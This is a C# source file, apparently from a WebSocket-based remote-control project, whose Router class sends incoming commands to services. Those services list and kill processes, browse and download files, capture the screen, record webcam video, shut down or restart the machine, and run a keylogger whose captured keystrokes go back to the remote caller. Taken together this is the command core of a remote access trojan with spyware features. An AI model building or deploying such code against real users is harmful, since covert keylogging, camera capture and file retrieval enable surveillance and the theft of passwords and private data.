using System;
using System.Threading.Tasks;
using WebSocketTest.Services;
using WebSocketTest.Models;

namespace WebSocketTest.Core
{
    // Command dispatcher - routes raw commands to appropriate services
    public class Router
    {
        private readonly AppService _appService;
        private readonly ProcessService _processService;
        private readonly FileService _fileService;
        private readonly ScreenService _screenService;
        private readonly WebcamService _webcamService;
        private readonly Func<string, Task> _sendAsync;

        public Router(AppService appService, ProcessService processService, FileService fileService, ScreenService screenService, WebcamService webcamService, Func<string, Task> sendAsync)
        {
            _appService = appService;
            _processService = processService;
            _fileService = fileService;
            _screenService = screenService;
            _webcamService = webcamService;
            _sendAsync = sendAsync ?? (s => Task.CompletedTask);
        }

        public string Dispatch(string message)
        {
            string[] parts = message.Split(new char[] { ' ' }, 2);
            string cmd = parts[0].Trim();
            string arg = parts.Length > 1 ? parts[1].Trim() : "";

            try
            {
                switch (cmd)
                {
                    case "listApps":
                        return _appService.GetApplicationList();
                    case "stopApp":
                        return _appService.StopAppByName(arg);
                    case "startApp":
                        return _appService.StartApp(arg);

                    case "listProcesses":
                        return _processService.GetFullProcessList();
                    case "killProcess":
                        if (int.TryParse(arg, out int pid)) return _processService.KillProcessByPid(pid);
                        return JsonResponse.Error("PID phải là số");

                    case "list_dir":
                        _ = Task.Run(async () =>
                        {
                            try
                            {
                                var json = await _fileService.ListDirectoryAsync(arg);
                                await _sendAsync(json);
                            }
                            catch (Exception ex)
                            {
                                await _sendAsync(JsonResponse.Error("List error: " + ex.Message));
                            }
                        });
                        return JsonResponse.Info("Listing directory...");

                    case "download_file":
                        _ = Task.Run(async () =>
                        {
                            try
                            {
                                await _fileService.DownloadFileAsync(arg, _sendAsync);
                            }
                            catch (Exception ex)
                            {
                                await _sendAsync(JsonResponse.Error("Download error: " + ex.Message));
                            }
                        });
                        return JsonResponse.Info("Starting download...");

                    case "PING":
                        return "PONG";

                    case "get_screen":
                        return _screenService.GetScreen();

                    case "keylog_start":
                        KeyLoggerService.Start();
                        return JsonResponse.Success("Đã bắt đầu ghi phím (Keylogger Started).");
                    case "keylog_stop":
                        KeyLoggerService.Stop();
                        string logs = KeyLoggerService.GetLogs();
                        string safeLogs = logs.Replace("\r", "").Replace("\n","\\n").Replace("\"", "\\\"");
                        KeyLoggerService.ClearLogs();
                        return $"{{\"type\": \"keylog_data\", \"data\": \"{safeLogs}\"}}";


                    case "shutdown":
                        ShutdownRestart.Shutdown();
                        return JsonResponse.Success("Lệnh tắt máy đã được gửi.");
                    case "restart":
                        ShutdownRestart.Restart();
                        return JsonResponse.Success("Lệnh khởi động lại đã được gửi.");

                    case "get_cam":
                        _ = Task.Run(async () =>
                        {
                            try
                            {
                                await _sendAsync(JsonResponse.Info("Đang quay video (5s)..."));
                                await _webcamService.CaptureAndSendAsync(_sendAsync, 7000);
                            }
                            catch (Exception ex)
                            {
                                await _sendAsync(JsonResponse.Error("Lỗi camera: " + ex.Message));
                            }
                        });
                        return JsonResponse.Info("Đang khởi động Camera...");

                    default:
                        return message;
                }
            }
            catch (Exception ex) { return JsonResponse.Error("Lỗi Server: " + ex.Message); }
        }
    }
}
